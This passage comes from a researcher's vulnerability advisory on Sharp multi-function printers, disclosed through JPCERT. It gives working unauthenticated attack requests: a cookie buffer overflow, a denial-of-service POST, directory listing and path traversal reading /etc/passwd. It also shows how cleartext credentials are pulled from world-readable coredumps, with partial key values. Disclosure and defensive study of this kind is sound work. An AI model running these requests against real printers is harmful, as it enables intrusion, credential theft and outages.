MX-M356N, MX-M316N, MX-M315N, MX-M356U, MX-M315U, MX-M356NV, MX-M316NV, MX-M315NV, MX-M356UV, MX-M315UV, 
MX-M3570, MX-M3070, MX-M3571, MX-M3071, MX-M3571S, MX-M3071S, MX-M465N A, MX-M365N A, MX-M503N, MX-M453N, 
MX-M363N, MX-M283N, MX-M503U, MX-M453U, MX-M363U, MX-M564N, MX-M464N, MX-M364N, MX-M564N A, MX-M565N, 
MX-M465N, MX-M365N, MX-M6050, MX-M5050, MX-M4050, MX-M6051, MX-M5051, MX-M4051, MX-M6070 A, MX-M4070 A, 
MX-M3070 A, MX-M6070, MX-M5070, MX-M4070, MX-M6071, MX-M5071, MX-M4071, MX-M6071S, MX-M5071S, MX-M4071S, 
MX-M753N, MX-M753U, MX-M623N, MX-M623U, MX-M754N, MX-M654N, MX-M754N A, MX-M654N A, MX-M7570, MX-M6570, 
MX-M905.
</code></pre>
<p><em>Miscellaneous notes</em>:</p>
<p>This security assessment was entirely done using a blackbox approach and fully-remote - I only had some IPs of printers (no physical access and no credentials for admin or normal users). Consequently, the physical security of the printers was not analyzed and the vulnerabilities were confirmed with about 15 different models running the latest firmware versions (MX-3060N, MX-3061, MX-3070N, MX-3560N, MX-3561, MX-5070V, MX-5071, MX-C3051R MX-C3081R, MX-M365N, MX-M453U, MX-M465N, MX-M5050, MX-M5051, MX-M6051 and MX-M6071).</p>
<p>The vulnerabilities were communicated to JPCERT on June 1, 2023 and communications with JPCERT were very effective - they fully managed interactions with Sharp.</p>
<p><em>Impacts</em></p>
<p>An attacker can compromise Sharp multi-function printers (MFP) and execute code. These printers are running Linux and are powerful. They are ideal to host implants (and fun programs, like Bettercap) and move laterally inside infrastructures.</p>
<p><em>Recommendations</em></p>
<ul>
<li>Use network segmentation to isolate MFPs.</li>
<li>Apply security patches.</li>
<li>Replace unsupported MFPs.</li>
</ul>
<p><a id="pre-auth-memory-corruption"></a></p>
<h2>Details - Memory corruption in the main program - Remote Code Execution against the web server without authentication</h2>
<p>By Default, Sharp printers are using a single super-program that will run as root and provide network daemons (ftp, http, snmp, raw-printer-9100, ...). This single program is vulnerable to a stack-based buffer overflow without authentication.</p>
<p>This <code>main</code> program runs as root and its HTTP stack is vulnerable, without authentication, to a stack-based buffer overflow, allowing an attacker to redirect the control flow of the program and achieve remote code execution.</p>
<p><code>main</code> program listening on port 80/tcp:</p>
<pre><code>sh-4.3# ps -auxww | grep main
root      1186  6.3  5.3 2124656 172688 ?      Sl   00:27  43:36 /tmp/app/ui/ui_mainview -hidecursor
root      2081  3.9 10.9 2515532 348980 ?      Sl   00:27  26:52 /tmp/main/main -cpu=1 -stack=8000 -fifo -nosigmask -nodlychk
root     13598  0.0  0.0   1980   368 pts/0    S+   11:49   0:00 grep main
sh-4.3# netstat -laputen | grep main
tcp        0      0 0.0.0.0:50001           0.0.0.0:*       LISTEN      0          10217       2081/main       
tcp6       0      0 :::443                  :::*            LISTEN      0          12538       2081/main       
tcp6       0      0 :::52000                :::*            LISTEN      0          33214       2081/main       
tcp6       0      0 :::10080                :::*            LISTEN      0          18542       2081/main       
tcp6       0      0 :::515                  :::*            LISTEN      0          10166       2081/main       
tcp6       0      0 :::53000                :::*            LISTEN      0          12539       2081/main       
tcp6       0      0 :::10443                :::*            LISTEN      0          18545       2081/main       
tcp6       0      0 :::5900                 :::*            LISTEN      0          33233       2081/main       
tcp6       0      0 :::9100                 :::*            LISTEN      0          12534       2081/main       
tcp6       0      0 :::80                   :::*            LISTEN      0          12537       2081/main       
tcp6       0      0 :::21                   :::*            LISTEN      0          10164       2081/main       
tcp6       0      0 :::631                  :::*            LISTEN      0          10168       2081/main       
udp        0      0 127.0.0.1:9473          0.0.0.0:*                   0          13202       2081/main       
udp6       0      0 :::5353                 :::*                        0          12497       2081/main       
udp6       0      0 :::161                  :::*                        0          33229       2081/main       
udp6       0      0 :::546                  :::*                        0          33145       2081/main       
sh-4.3#
</code></pre>
<p>By default, the printer will provide a MFPSESSIONID cookie when reaching the printer with a browser as shown below. This cookie will then be used for authentication purposes if the user decides to log into the printer. For example, with a HTTP request to /main.html:</p>
<pre><code>kali% curl -kv http://10.0.0.1/main.html | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.0.0.1:80...
* Connected to 10.0.0.1 (10.0.0.1) port 80 (#0)
&gt; GET /main.html HTTP/1.1
&gt; Host: 10.0.0.1
&gt; User-Agent: curl/7.88.1
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Server: Rapid Logic/1.1
&lt; MIME-version: 1.0
&lt; Date: Thu Jan  1 02:32:35 1970 GMT
&lt; Content-Type: text/html; charset=UTF-8
&lt; Transfer-Encoding: chunked
&lt; Connection: close
&lt; Pragma: no-cache
&lt; Cache-Control: no-cache
&lt; X-Frame-Options: DENY
&lt; Set-Cookie: MFPSESSIONID=020015D2C59E7B68C9FB5F411B0E59FCBEF70F7E03CEE4C4C5A12023051115051847BC555A
&lt; Extend-sharp-setting-status: 0
&lt; 
{ [2 bytes data]
&lt;!DOCTYPE html&gt;
&lt;html  lang="en"&gt;
&lt;head&gt;
&lt;meta charset="UTF-8" /&gt;
&lt;meta name="viewport" content="width=320,initial-scale=1.0" /&gt;
&lt;meta name="format-detection" content="telephone=no" /&gt;
&lt;meta http-equiv="X-UA-Compatible" content="IE=8; IE=10; IE=11" /&gt;
&lt;title&gt;Machine Identification - MX-M6071&lt;/title&gt;
&lt;link rel="stylesheet" href="other.css" type="text/css" /&gt;
&lt;link rel="stylesheet" href="color1.css" type="text/css" /&gt;
* Failure writing output to destination
* Failed reading the chunked-encoded stream
100  6950    0  6950    0     0   196k      0 --:--:-- --:--:-- --:--:--  199k
* Closing connection 0
curl: (23) Failure writing output to destination
kali%
</code></pre>
<p>By sending a malicious HTTP request with a long MFPSESSIONID cookie, it is possible to overwrite the stack of the main program.</p>
<p>This payload will send a MFPSESSIONID cookie with a payload of 643 bytes. This payload will overwrite a stack buffer inside the main program. The buffer is probably 639 bytes and <code>EDBB</code> will overwrite the stack:</p>
<pre><code>kali% var=`perl -e "print 'A'x639"`; curl -v -b "MFPSESSIONID=${var}EDCB" http://10.0.0.1/system.html
*   Trying 10.0.0.1:80...
* Connected to 10.0.0.1 (10.0.0.1) port 80 (#0)
&gt; GET /system.html HTTP/1.1
&gt; Host: 10.0.0.1
&gt; User-Agent: curl/7.88.1
&gt; Accept: */*
&gt; Cookie
&gt;
</code></pre>
<p>If /system.html does not exist, it is possible to use /main.html or any existing html webpage instead:</p>
<pre><code>kali% var=`perl -e "print 'A'x639"`; curl -v -b "MFPSESSIONID=${var}EDCB" http://10.0.0.1/main.html
*   Trying 10.0.0.1:80...
* Connected to 10.0.0.1 (10.0.0.1) port 80 (#0)
&gt; GET /system.html HTTP/1.1
&gt; Host: 10.0.0.1
&gt; User-Agent: curl/7.88.1
&gt; Accept: */*
&gt; Cookie
&gt;
</code></pre>
<p>If the first exploitation does not work, it is possible to resend it again to overwrite the stack the second time:</p>
<pre><code>kali% var=`perl -e "print 'A'x639"`; curl -v -b "MFPSESSIONID=${var}EDCB" http://10.0.0.1/system.html
*   Trying 10.0.0.1:80...
* Connected to 10.0.0.1 (10.0.0.1) port 80 (#0)
&gt; GET /system.html HTTP/1.1
&gt; Host: 10.0.0.1
&gt; User-Agent: curl/7.88.1
&gt; Accept: */*
&gt; Cookie: MFPSESSIONID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEDCB
kali% var=`perl -e "print 'A'x639"`; curl -v -b "MFPSESSIONID=${var}EDCB" http://10.0.0.1/system.html
*   Trying 10.0.0.1:80...
* Connected to 10.0.0.1 (10.0.0.1) port 80 (#0)
&gt; GET /system.html HTTP/1.1
&gt; Host: 10.0.0.1
&gt; User-Agent: curl/7.88.1
&gt; Accept: */*
&gt; Cookie
</code></pre>
<p>The <code>dmesg</code> output on the printer will confirm that the main program crashed while trying to reach the address 0x42434445, corresponding to the previous <code>EDCB</code> sent inside the cookie. <code>EDCB</code> is represented in the little-endian format as ARM is little-endian and 0x42434445 can be found inside several registers (but not PC).</p>
<p>output of <code>dmesg</code>:</p>
<pre><code>[  127.970220] main[15612]: unhandled level 2 translation fault (11) at 0x42434445, esr 0x92000006
[  127.979463] pgd = ffff80007a07e000
[  127.982981] [42434445] *pgd=00000000fa099003, *pud=00000008c6f9d003, *pmd=0000000000000000

[  127.992811] CPU: 1 PID: 15612 Comm: main Tainted: P           O    4.1.46-rt52 #2
[  128.000296] Hardware name: LS1043A MFP Board (DT)
[  128.005195] task: ffff8008372c69c0 ti: ffff80083dde0000 task.ti: ffff80083dde0000
[  128.012710] PC is at 0x20d4ff8
[  128.015761] LR is at 0x2a0
[  128.018465] pc : [&lt;00000000020d4ff8&gt;] lr : [&lt;00000000000002a0&gt;] pstate: 900f0010
[  128.026024] sp : 000000008f12f7c0
[  128.029335] x12: 0000000042434445 
[  128.032981] x11: 000000008fd45008 x10: 0000000000000001 
[  128.038298] x9 : 0000000091247bf8 x8 : 000000008fd5648c 
[  128.043678] x7 : 0000000000000000 x6 : 000000008fd56c58 
[  128.048996] x5 : 000000008fd569bc x4 : 0000000008b90bdc 
[  128.054388] x3 : 0000000042434445 x2 : 0000000042434445 
[  128.059834] x1 : 000000008fd569b8 x0 : 0000000000000001
</code></pre>
<p>On the printer, using GDB, we will confirm the main program crashed and the stack has been successfully corrupted:</p>
<pre><code>sh-4.3# ps -auxww|grep main
root      1186  9.7  4.9 2123632 158080 ?      Sl   11:31   0:21 /tmp/app/ui/ui_mainview -hidecursor
root      2023  7.8  9.8 2505880 316360 ?      Sl   11:31   0:15 /tmp/main/main -cpu=1 -stack=8000 -fifo -nosigmask -nodlychk
root     26544  0.0  0.0   1980   376 pts/0    S+   11:34   0:00 grep main
sh-4.3# gdb -p 2023
GNU gdb (GDB) 7.10.1.20160210-cvs
warning: File "/lib/libthread_db-1.0.so" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
0xf744f1c4 in pthread_join () from /lib/libpthread.so.0
(gdb) c

...
[LWP 32749 exited]
[New LWP 32750]
[New LWP 32751]
[LWP 32751 exited]
[New LWP 32752]
...
[New LWP 27196]
[LWP 27196 exited]
[New LWP 27197]

Program received signal SIGSEGV, Segmentation fault.
[Switching to LWP 27195]
0x020d4ff8 in ?? ()
(gdb) bt
#0  0x020d4ff8 in ?? ()
#1  0x000002a0 in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) info reg
r0             0x1      1
r1             0x903e0ec8       2419986120
r2             0x42434445       1111704645
r3             0x42434445       1111704645
r4             0x8b90bdc        146344924
r5             0x903e0ecc       2419986124
r6             0x903e1168       2419986792
r7             0x0      0
r8             0x903e082c       2419984428
r9             0x918ddcb8       2441993400
r10            0x1      1
r11            0x903db008       2419961864
r12            0x42434445       1111704645
sp             0x72231fc0       0x72231fc0
lr             0x2a0    672
pc             0x20d4ff8        0x20d4ff8
cpsr           0x90050010       -1878720496
(gdb) info frame
Stack level 0, frame at 0x72231fc0:
 pc = 0x20d4ff8; saved pc = 0x2a0
 called by frame at 0x72231fc0
 Arglist at 0x72231fc0, args: 
 Locals at 0x72231fc0, Previous frame's sp is 0x72231fc0
(gdb)
</code></pre>
<p>There is no ASLR in the <code>main</code> program; the addresses are always identical therefore exploitation is very likely.    </p>
<p>Exploitation was not attempted since no enough time was allocated to develop such exploit during this security assessment and I already had a remote shell as root on the printers. Sharp confirmed that exploitation is possible.</p>
<p>An attacker with a RCE vulnerability can then move laterally and use Wifi to exfiltrate information:</p>
<pre><code>bash-4.3# iwlist ath0 scan
ath0      Scan completed :
          Cell 01 - Address: 00:3C:10:01:02:03
                    ESSID:"[REDACTED]"
                    Mode:Master
                    Frequency:2.412 GHz (Channel 1)
                    Quality=93/94  Signal level=-54 dBm  Noise level=-95 dBm
                    Encryption key:off
                    Bit Rates:12 Mb/s; 18 Mb/s; 24 Mb/s; 36 Mb/s; 48 Mb/s
                              54 Mb/s
                    Extra:bcn_int=100

bash-4.3#
</code></pre>
<p><a id="pre-auth-invalid-pointer-dereference"></a></p>
<h2>Details - Invalid (0x000000d0) pointer dereference - Remote DoS without authentication</h2>
<p>It was observed that the <code>/billcodedef_sub_sel.html</code> webpage is reachable without authentication on Sharp printers. A specific request to this webpage will trigger an invalid pointer deference in the main program. The printer will then reboot after creating coredump files.</p>
<p><img alt="" src="images/2024-sharp-billcodedef_sub_sel.png" /></p>
<p><a href="images/2024-sharp-billcodedef_sub_sel-full.png">Click here for full image</a></p>
<p>When submitting the request with the Sub Code <code>test</code> by pressing <code>Search Start(Q)</code>, the HTTP request will be:</p>
<p>HTTP request using the HTML form from <code>billcodedef_sub_sel.html</code>:</p>
<p><img alt="" src="images/2024-sharp-null-pointer-dereference-ok.png" /></p>
<p><a href="images/2024-sharp-null-pointer-dereference-ok-full.png">Click here for full image</a></p>
<p>It is possible to modify the HTTP request to change <code>curr_page_url=%2Fbillcodedef_sub_sel.html</code> to <code>curr_page_url=%2Fbillcodedef_sub_sel.html?</code>. A question mark was added after <code>billcodedef_sub_sel.html</code>.</p>
<p>The resulting request will be:</p>
<p><img alt="" src="images/2024-sharp-null-pointer-dereference.png" /></p>
<p><a href="images/2024-sharp-null-pointer-dereference-full.png">Click here for full image</a></p>
<p>The corresponding malicious HTTP request to trigger the DoS is:</p>
<pre><code>POST /billcodedef_sub_sel.html? HTTP/1.1
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 406 
Origin: http://10.0.0.1
Connection: close
Referer: http://10.0.0.1/billcodedef_sub_sel.html?
Cookie: MFPSESSIONID=020035B15A47378CF80C6175263F714EEF9118E72A1AA6C9CAC6202305181146331E5FF54; sideBarflag=1
Upgrade-Insecure-Requests: 1

billing_code_def_selWebchg=&amp;action=searchbtn&amp;ordinate=0&amp;token2=AEC039F52DC886D169AC7F977F61D4C61295539BC0A3572B08E37FB291B9A766E238FB699426F67B&amp;ggt_textbox%288%29=test&amp;ggt_textbox%2811%29=&amp;ggt_select%2829%29=1&amp;billing_radio=2%2C&amp;BillingCode%282%2C%29=Not+Set&amp;BillingCodeName%28%29=&amp;ggt_hidden%2839%29=0&amp;ggt_hidden%2840%29=1&amp;ggt_hidden%2844%29=&amp;curr_page_url=%2Fbillcodedef_sub_sel.html?&amp;selBillingCodeName=
</code></pre>
<p>We can also reproduce the issue using curl:</p>
<pre><code>kali% curl -i -s -k -X $'POST' -H $'Host: 10.0.0.1' --data-binary 'curr_page_url=%2Fbillcodedef_sub_sel.html?' 'http://10.0.0.1/billcodedef_sub_sel.html'
</code></pre>
<p>On the printer, we can see a crash:</p>
<pre><code>[ 9914.440518] main[18602]: unhandled level 3 translation fault (11) at 0x000000d0, esr 0x92000007
[ 9914.453538] pgd = ffff80082f408000
[ 9914.456936] [000000d0] *pgd=00000000f9ea6003, *pud=00000000f9f6e003, *pmd=00000000f9c0f003, *pte=0000000000000000

[ 9914.468751] CPU: 1 PID: 18602 Comm: main Tainted: P           O    4.1.46-rt52 #2
[ 9914.476433] Hardware name: LS1043A MFP Board (DT)
[ 9914.481138] task: ffff80083de6c680 ti: ffff80082cb20000 task.ti: ffff80082cb20000
[ 9914.488691] PC is at 0x228fe6c
[ 9914.491744] LR is at 0x228f820
[ 9914.494830] pc : [&lt;000000000228fe6c&gt;] lr : [&lt;000000000228f820&gt;] pstate: 600f0010
[ 9914.502227] sp : 000000007212fd70
[ 9914.505539] x12: 00000000ffffffff 
[ 9914.508939] x11: 000000007212fdb0 x10: 0000000000000001 
[ 9914.514367] x9 : 0000000091170990 x8 : 0000000000000002 
[ 9914.519683] x7 : 000000007212fd88 x6 : 0000000091172799 
[ 9914.525102] x5 : 0000000000000000 x4 : 0000000000000000 
[ 9914.530417] x3 : 0000000000000000 x2 : 000000007212fdd0 
[ 9914.535764] x1 : 0000000000000061 x0 : 0000000000000000

[ 9914.543566] [BSPIF]bspif_pof_wait:signal receive(-512)
[ 9914.548702] [BSPIF]bspif_pof_wait:
[ 9988.116784] Panic : Oops Exit !!! [comm:irq/20-serial] [user_mode:0]
</code></pre>
<p>With the creation of the corresponding coredump files:</p>
<pre><code>sh-4.3# cd /mnt/log &amp;&amp; ls -latr
[...]
-rw-r--r--  1 root root  19133981 May 18 11:48 core-main.log.gz.001
-rw-r--r--  1 root root         0 May 18 11:48 ERR_IFS.log
-rw-r--r--  1 root root  19133981 May 18 11:48 ERR_core-main.log.gz
-rw-r--r--  1 root root     97230 May 18 11:48 ERR_kern.log
-rw-r--r--  1 root root         0 May 18 11:48 ERR_core-pdl.log.gz
-rw-r--r--  1 root root         0 May 18 11:48 ERR_log_ui_mainview.log
-rw-r--r--  1 root root     21262 May 18 11:48 ERR_pdl.log
-rw-r--r--  1 root root       315 May 18 11:48 ERR_nf.log
-rw-r--r--  1 root root    314620 May 18 11:48 ERR_main.log
-rw-r--r--  1 root root     97363 May 18 11:48 kern.log.001
-rw-r--r--  1 root root     18653 May 18 11:48 vmstat.log.001
-rw-r--r--  1 root root       377 May 18 11:48 umount.log.001
-rw-r--r--  1 root root      1861 May 18 11:48 slinkerr1.log
-rw-r--r--  1 root root      4582 May 18 11:48 slinkerr0.log
-rw-r--r--  1 root root     45625 May 18 11:48 watch_idle.log
-rw-r--r--  1 root root    314692 May 18 11:49 main.log
-rw-r--r--  1 root root       132 May 18 11:49 bsp.log
-rw-r--r--  1 root root     96435 May 18 11:49 kern.log
-rw-r--r--  1 root root       407 May 18 11:49 vmstat.log
sh-4.3# date
Thu May 18 11:50:40 UTC 2023
sh-4.3# uptime
 11:51:55 up 3 min,  0 users,  load average: 1.36, 0.95, 0.40
sh-4.3#
</code></pre>
<p><a id="world-readable-coredump-files-insecure-storage-creds"></a></p>
<h2>Details - World-readable coredump files and insecure storage of credentials</h2>
<p>It was observed that the coredump files located in the Sharp printers have incorrect permissions. Any local user can read them. These coredump files contain all the clear-text credentials of the users.</p>
<p>Core files present in /mnt/log:</p>
<pre><code>sh-4.3# ls -la /mnt/log | grep core
-rw-r--r--  1 root root  16120921 May 11 15:18 ERR_core-main.log.gz
-rw-r--r--  1 root root         0 May 11 15:18 ERR_core-pdl.log.gz
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-IFS.log.gz
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-IFS.log.gz.001
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-IFS.log.gz.002
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-NX.log.gz
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-NX.log.gz.001
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-NX.log.gz.002
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-bcr_iface.log.gz
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-bcr_iface.log.gz.001
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-bcr_iface.log.gz.002
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-main.log.gz
-rw-r--r--  1 root root         0 Jan  1  2000 SWOFF_core-main.log.gz.001
...
-rw-r--r--  1 root root         0 Jan  1  2000 core-main.log.gz
-rw-r--r--  1 root root  16120921 May 11 15:18 core-main.log.gz.001
-rw-r--r--  1 root root  13566117 May 11 15:16 core-main.log.gz.002
-rw-r--r--  1 root root  17158453 May 11 15:12 core-main.log.gz.003
-rw-r--r--  1 root root  17332354 May 11 12:32 core-main.log.gz.004
-rw-r--r--  1 root root  20440117 May 11 12:28 core-main.log.gz.005
-rw-r--r--  1 root root  22170528 May 10 11:47 core-main.log.gz.006
-rw-r--r--  1 root root         0 Jan  1  2000 core-main.log.gz.007
...
sh-4.3# cd /mnt/log &amp;&amp; ls -la|grep ERR
-rw-r--r--  1 root root         0 May 15 14:11 ERR_IFS.log
-rw-r--r--  1 root root  17316180 May 15 14:11 ERR_core-main.log.gz
-rw-r--r--  1 root root         0 May 15 14:11 ERR_core-pdl.log.gz
-rw-r--r--  1 root root     97316 May 15 14:11 ERR_kern.log
-rw-r--r--  1 root root         0 May 15 14:11 ERR_log_ui_mainview.log
-rw-r--r--  1 root root    314188 May 15 14:11 ERR_main.log
-rw-r--r--  1 root root       315 May 15 14:11 ERR_nf.log
-rw-r--r--  1 root root     21262 May 15 14:11 ERR_pdl.log
sh-4.3#
</code></pre>
<p>The files are world-readable and contain valid coredump files as shown below:</p>
<pre><code>kali% file core-main.log
core-main.log: ELF 32-bit LSB core file, ARM, version 1 (SYSV), SVR4-style, from '/tmp/main/main -cpu=1 -stack=8000 -fifo -nosigmask -nodlychk', real uid: 0, effective uid: 0, real gid: 0, effective
</code></pre>
<p>The core file contains in clear-text:</p>
<ul>
<li>session IDs;</li>
<li>password for all the users (even when the printer booted and no user logged into the printer (!));</li>
<li>emails;</li>
<li>Encryption keys.</li>
</ul>
<p>For example, some keys:</p>
<pre><code>kali% strings core-main.log|grep -A 4 -B 4 ENCRYPT_KEY
CloudPollingConst
VENDOR_KEY
YiqUwHIymoiuwFPjja04u+Q+zeokggNSuYv4g+axNAIx4vwnnrPmfsFrAsqZr4RFeR6EgwWRvzgledwTz9MZAw==
TENANT_ENCRYPT_KEY
GMuQt[REDACTED]
</code></pre>
<p>The core file contains the password (<code>PASS-PIERRE</code>) of the admin user even when the admin user has not been logged-in the printer since the printer booted:</p>
<pre><code>kali% zcat core-main.log.gz.001 | strings | grep PASS-PIERRE
PASS-PIERRE
</code></pre>
<p>All the clear-text passwords can be found inside the core file:</p>
<pre><code>kali% zcat core-main.log.gz.001 | strings | less
/mnt/std01/ACCBURS/
/mnt/std04/ACC/BROWSER/BROWSER_NONUSR  
/mnt/std01/ACC/AccBackUp/BROWSER_NONUSR
/mnt/std01/ACC/AccUserInfo      
/mnt/std04/ACC
/mnt/std01/ACC/AccUserInfo2     
/mnt/std04/ACC/BROWSER
/mnt/std01/ACC/AccGrpPrmtInfo   
/mnt/std01/ACCBURS 
/mnt/std01/ACC/AccFlashUserCounter
/mnt/std01/ACC/AccFlashBackUp   
/mnt/std01/ACC/AccTotalPix      
/mnt/std01/ACC/AccBackUp/JobInfo
Other User  
Other
Vender
Vender
Administrator 
admin
PASS-PIERRE &lt;------------------- clear-text password for admin
Service
service
service
User
users
users
Vender2
Vender2
FSS User
servicefss
servicefss
System Operator
sysadmin
sysadmin
Device Account
deviceaccount
deviceaccount
/mnt/std01/ACC/AccGrpHomeInfo
/mnt/std01/ACC/AccBackUp
/mnt/std01/ACC
/mnt/std01/ACC/AccUserPixel
/mnt/std01/ACC/BROWSER
/mnt/std01/ACC/AccGrpCstmInfo
</code></pre>
<p>There is no encryption for the /mnt/log partition:</p>
<pre><code>sh-4.3# df -h /mnt/log
Filesystem      Size  Used Avail Use% Mounted on
/dev/mmcblk0p3  791M  145M  589M  20% /mnt/log
sh-4.3#
</code></pre>
<p>All the passwords can be found inside the core file after the printer just booted and no user logged: this is abnormal and shows the authentication mechanism is incorrectly implemented.</p>
<p>A local attacker can extract all the passwords.</p>
<p>A remote attacker using an additional vulnerability (e.g. Local File Inclusion) can recover all the passwords and compromise the printer (see the next vulns).</p>
<p><a id="pre-auth-arbitrary-directory-listing"></a></p>
<h2>Details - Arbitrary Directory Listing without authentication</h2>
<p>It was observed that Sharp printers are vulnerable to an arbitrary directory listing without authentication. Any attacker can list any directory located in the printer and recover any file.</p>
<p>It is possible to list the manual index files by visiting the <code>/installed_emanual_list.html</code> without authentication:</p>
<p><img alt="" src="images/2024-sharp-directory-listing-1.png" /></p>
<p><a href="images/2024-sharp-directory-listing-1-full.png">Click here for full image</a></p>
<p>By changing the folder argument in the address, it is possible to browse the entire file systems of the printer.</p>
<p>Request to <code>installed_emanual_list.html?folder=../../../</code> will list the <code>/</code> file system:</p>
<p><img alt="" src="images/2024-sharp-directory-listing-2.png" /></p>
<p><a href="images/2024-sharp-directory-listing-2-full.png">Click here for full image</a></p>
<p>Files located in /etc:</p>
<p><img alt="" src="images/2024-sharp-directory-listing-3.png" /></p>
<p><a href="images/2024-sharp-directory-listing-3-full.png">Click here for full image</a></p>
<p>Using the vulnerability <a href="#pre-auth-lfi">Local File Inclusion allowing to read any file (e.g. Coredump files)</a>, it is then possible to download any file.</p>
<p>An attacker can browse the file systems of the printers and download any file.</p>
<p>A remote attacker can recover all the passwords by downloading coredump files and compromise the printer.</p>
<p><a id="pre-auth-lfi"></a></p>
<h2>Details - Local File Inclusion allowing to read any file (e.g. Coredump files) without authentication</h2>
<p>It was observed that Sharp printers are vulnerable to a local file inclusion without authentication. Any attacker can read any file located in the printer.</p>
<p>Normal request to retrieve the manual index files:</p>
<p><img alt="" src="images/2024-sharp-lfi-01.png" /></p>
<p>By default, the manual index files are located in /mnt/std_data/manual inside the printer:</p>
<pre><code>sh-4.3# pwd
/mnt/std_data/manual
sh-4.3# ls -la MX-M4071_inch_web.idx
-rw-rw-r-- 1 1000 pulse 1564 Jul 30  2020 MX-M4071_inch_web.idx
sh-4.3# ls -la
total 233
drwxrwxr-x  4 1000 pulse 2536 Jul 31  2020 .
drwxr-xr-x  9 root root  4096 Mar  1  2022 ..
-rw-rw-r--  1 1000 pulse 1564 Jul 30  2020 MX-M2651_ab_web.idx
-rw-rw-r--  1 1000 pulse  562 Jul 30  2020 MX-M2651_aus_web.idx
-rw-rw-r--  1 1000 pulse 1564 Jul 30  2020 MX-M2651_canada_web.idx
-rw-rw-r--  1 1000 pulse 9590 Jul 30  2020 MX-M2651_europe_web.idx
-rw-rw-r--  1 1000 pulse 1564 Jul 30  2020 MX-M2651_inch_web.idx
-rw-rw-r--  1 1000 pulse  562 Jul 30  2020 MX-M2651_uk_web.idx
-rw-rw-r--  1 1000 pulse 1564 Jul 30  2020 MX-M2651_usa_web.idx
-rw-rw-r--  1 1000 pulse 1564 Jul 30  2020 MX-M3051_ab_web.idx
-rw-rw-r--  1 1000 pulse  562 Jul 30  2020 MX-M3051_aus_web.idx
-rw-rw-r--  1 1000 pulse 1564 Jul 30  2020 MX-M3051_canada_web.idx
-rw-rw-r--  1 1000 pulse 9590 Jul 30  2020 MX-M3051_europe_web.idx
</code></pre>
<p>The normal request is:</p>
<pre><code>GET /installed_emanual_down.html?path=/manual/MX-M4071_inch_web.idx  HTTP/1.1
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre>
<p>The <code>path=</code> argument can be manipulated to retrieve any file in the printer. The session cookie is not required as this vulnerability does not require authentication:</p>
<p>For example, retrieving /etc/passwd:</p>
<pre><code>GET /installed_emanual_down.html?path=/manual/../../../etc/passwd  HTTP/1.1
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre>
<p><img alt="" src="images/2024-sharp-lfi-02.png" /></p>
<p>It is possible to generate a coredump file, download it and extract credentials to remotely compromise the printer without credentials using this vulnerability along with the vulnerabilities:</p>
<ul>
<li><a href="#pre-auth-invalid-pointer-dereference">Invalid (0x000000d0) pointer dereference - Remote DoS without authentication</a> or</li>
<li><a href="#pre-auth-memory-corruption">Memory corruption in the main program - Remote Code Execution against the web server without authentication</a> and</li>
<li><a href="#world-readable-coredump-files-insecure-storage-creds">World-readable coredump files and insecure storage of credentials</a>, </li>
</ul>
<p><a id="pre-auth-lfi-pwn-01"></a></p>
<h3>Generation of the coredump file on the printer</h3>
<p>Using the HTTP request:</p>
